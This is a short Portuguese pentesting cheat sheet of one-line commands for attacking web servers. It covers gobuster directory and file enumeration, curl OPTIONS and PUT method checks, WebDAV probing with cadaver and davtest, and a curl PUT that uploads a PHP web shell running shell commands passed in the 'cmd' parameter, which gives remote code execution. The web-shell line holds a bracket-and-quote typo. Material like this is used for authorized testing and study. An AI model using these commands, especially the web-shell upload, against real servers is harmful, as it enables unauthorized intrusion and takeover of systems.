# Enumeração de Diretórios e Arquivos

Enumeração de diretórios com wordlist e filtro de status code.
`gobuster dir -e -u http://192.168.0.1/ -w /wordlist.txt -s "200,403"`

Enumeração de arquivos
`gobuster dir -e -u http://192.168.0.1/ -w /wordlist.txt -x .php,.txt,.sql,.bkp`

Verificar métodos aceitos
`curl -v -X OPTIONS http://192.168.0.1/`

Testar a criação de arquivo com método PUT
`curl -v -X PUT /alvo/arquivo.php`

Criar e enviar payload de RCE em PHP
`curl -v -X PUT -d "<?php system(\$_GET[]"cmd"]); ?>" http://192.168.0.1/rce.php`

Upload de arquivo com curl
`curl -v http://192.168.0.1/ --upload-file arquivo.php`

Conectar em um servidor webdav
`cadaver http://192.168.0.1/webdav/`

Enumerar métodos e extensões permitidas em um servidor webdav
`davtest --url http://192.168.0.1/webdav/`